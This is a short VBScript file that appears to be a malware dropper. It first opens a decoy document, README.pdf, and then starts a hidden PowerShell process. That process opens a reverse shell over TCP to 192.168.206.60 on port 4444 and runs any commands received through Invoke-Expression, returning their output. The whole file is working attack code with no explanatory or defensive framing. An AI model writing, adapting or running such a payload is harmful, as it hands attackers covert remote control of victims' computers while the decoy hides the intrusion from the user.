Set File1 = CreateObject("WScript.Shell")
File1.Run ("README.pdf")


Set objShell = CreateObject("WScript.Shell")
objShell.Run("powershell -windowstyle Hidden -nop -Command ""$client = New-Object System.Net.Sockets.TCPClient('192.168.206.60',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()""")
